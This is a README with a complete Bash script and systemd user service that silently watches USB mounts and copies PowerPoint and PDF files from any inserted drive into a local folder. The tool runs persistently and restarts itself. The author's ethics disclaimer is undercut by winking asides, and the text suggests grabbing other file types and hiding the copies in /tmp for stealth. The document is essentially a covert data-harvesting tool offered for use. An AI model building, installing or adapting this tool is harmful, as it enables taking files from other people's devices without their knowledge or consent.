# APEC USB PPT/PDF Watcher

This repository contains a Bash script and `systemd --user` service setup for watching USB mount locations and copying `.ppt`, `.pptx`, and `.pdf` files into `~/APEC_files`.

> **Note:** Use this only in an authorized cybersecurity lab, assignment environment, or on systems and USB devices where you have permission. (I mean you know !)

---
Do not use this to collect files from someone else’s device without consent.

The USB goblin must stay ethical,but you know there are uncharted territories !

## Folder Style

```text
apec-usb-ppt-watcher/
├── README.md
├── apec_usb_ppt_watcher.sh
├── apec-usb-ppt-watcher.service
└── commands.txt
```

---

## Commands and Script

### 1. Create Local Bin Directory

```bash
mkdir -p ~/.local/bin
```

---

### 2. Create Script File

```bash
nano ~/.local/bin/apec_usb_ppt_watcher.sh
```

---

### 3. SCRIPT

Paste this script:

```bash
#!/bin/bash

set -u

USER_NAME="${USER:-$(id -un)}"
DEST="$HOME/APEC_files"
mkdir -p "$DEST"

declare -A SEEN

copy_from_mount() {
    local mount_point="$1"
    [ -d "$mount_point" ] || return 0

    local drive_name
    drive_name="$(basename "$mount_point")"

    find "$mount_point" -type f \( -iname "*.ppt" -o -iname "*.pptx" -o -iname "*.pdf" \) -print0 2>/dev/null |
    while IFS= read -r -d '' src; do
        rel="${src#"$mount_point"/}"
        target="$DEST/$drive_name/$rel"

        mkdir -p "$(dirname "$target")"
        cp -n -- "$src" "$target" 2>/dev/null
    done
}

while true; do
    declare -A CURRENT=()

    for base in "/media/$USER_NAME" "/run/media/$USER_NAME"; do
        [ -d "$base" ] || continue

        while IFS= read -r -d '' mount_point; do
            CURRENT["$mount_point"]=1

            if [[ -z "${SEEN[$mount_point]+x}" ]]; then
                copy_from_mount "$mount_point"
                SEEN["$mount_point"]=1
            fi
        done < <(find "$base" -mindepth 1 -maxdepth 1 -type d -print0 2>/dev/null)
    done

    for old_mount in "${!SEEN[@]}"; do
        if [[ -z "${CURRENT[$old_mount]+x}" ]]; then
            unset 'SEEN[$old_mount]'
        fi
    done

    sleep 2
done
```
---
so yeah you can change it as you please to whatever name and whatever files you want including .slx,.py and many more !
Another improvision you can do is just create the directory in tmp folder so it wont even be visible, the current script implements a cavemen version of stealth its easy to get caught as the folder is created in home directory itself(ik its dumb) but you can always point it to store it in "tmp", just adds an extra layer !
### 4. Fix Line Endings

```bash
sed -i 's/\r$//' ~/.local/bin/apec_usb_ppt_watcher.sh
```

---

### 5. Give Execute Permission

```bash
chmod +x ~/.local/bin/apec_usb_ppt_watcher.sh
```

---

## USER SERVICE

### 6. Create systemd User Directory

```bash
mkdir -p ~/.config/systemd/user
```

---

### 7. Create Service File

```bash
nano ~/.config/systemd/user/apec-usb-ppt-watcher.service
```

---

### 8. userconfig

Paste this configuration:

```ini
[Unit]
Description=Watch USB mounts and copy PPT/PPTX files to ~/APEC_files
After=default.target

[Service]
Type=simple
ExecStart=/bin/bash %h/.local/bin/apec_usb_ppt_watcher.sh
Restart=always
RestartSec=2

[Install]
WantedBy=default.target
```

---

### 9. Reload systemd User Services

```bash
systemctl --user daemon-reload
```

---

### 10. Enable and Start Service

```bash
systemctl --user enable --now apec-usb-ppt-watcher.service
```

---

### 11. Check Service Status

```bash
systemctl --user status apec-usb-ppt-watcher.service
```

---

### 12. Test the Script

test the script is running before inserting pendrive(run the script for 5-10 secs and then hit ctrl+C)

```bash
/bin/bash ~/.local/bin/apec_usb_ppt_watcher.sh
```

---

### m1. Find Copied Files

TO find the copied files:

```bash
find ~/APEC_files -type f \( -iname "*.ppt" -o -iname "*.pptx" \)
```

To also include `.pdf` files:

```bash
find ~/APEC_files -type f \( -iname "*.ppt" -o -iname "*.pptx" -o -iname "*.pdf" \)
```

---

### 13. Stop Right Now

```bash
systemctl --user stop apec-usb-ppt-watcher.service
```

---

### 14. Stop and Prevent from Future Auto Turn On

```bash
systemctl --user disable --now apec-usb-ppt-watcher.service
```

---

## above 2 commands to disable the service

### 15. To Turn On Later

```bash
systemctl --user enable --now apec-usb-ppt-watcher.service
```

---

## 16. Uninstall / Cleanup from System

```bash
systemctl --user disable --now apec-usb-ppt-watcher.service
rm -f ~/.config/systemd/user/apec-usb-ppt-watcher.service
rm -f ~/.local/bin/apec_usb_ppt_watcher.sh
systemctl --user daemon-reload
```

---

## Extra Technical Details

### Output Directory

Copied files will be saved here:

```bash
~/APEC_files
```

Example copied file path:

```text
~/APEC_files/<pendrive-name>/<original-folder>/<file-name>.pptx
```

---

### Mount Locations Checked by Script

The script checks these common Linux USB mount paths:

```bash
/media/$USER
/run/media/$USER
```

---

### File Extensions Copied

The script copies:

```text
.ppt
.pptx
.pdf
```

---

### Copy Behavior

The script uses:

```bash
cp -n
```

This means files are copied only if the destination file does not already exist.
Thats it folks, use it as you may please!!

---



